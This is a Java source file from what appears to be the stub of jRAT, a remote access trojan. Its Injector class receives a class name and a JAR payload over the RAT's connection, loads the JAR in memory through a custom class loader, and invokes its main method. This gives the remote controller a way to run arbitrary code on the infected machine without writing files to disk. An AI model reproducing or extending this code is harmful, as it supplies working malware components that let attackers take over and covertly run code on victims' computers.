package su.jrat.stub;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.jar.JarInputStream;

public class Injector {
	
	public void inject(DataInputStream in) throws Exception {
		String mainClass = Connection.readLine();
		int size = in.readInt();
		
		byte[] buffer = new byte[size];
		
		in.readFully(buffer);
		
		ByteArrayInputStream bais = new ByteArrayInputStream(buffer);
		
		InjectorClassloader classLoader = new InjectorClassloader(Injector.class.getClassLoader(), new JarInputStream(bais));
	
		Class<?> classToLoad = classLoader.loadClass(mainClass);
		Method method = classToLoad.getMethod("main", new Class[] { String[].class });
		
		method.invoke(classToLoad.newInstance(), new Object[] { new String[0] });
	}
	
	public static String getClassName(String fileName) {
		return fileName.substring(0, fileName.length() - 6).replace('/', '.');
	}

	public static byte[] fromInputStream(InputStream stream, int size) throws Exception {
		byte[] buffer = new byte[1024];
		int count = 0;
		
		ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

		while ((count = stream.read(buffer)) != -1) {
			out.write(buffer, 0, count);
		}

		out.close();
		
		return out.toByteArray();
	}
}
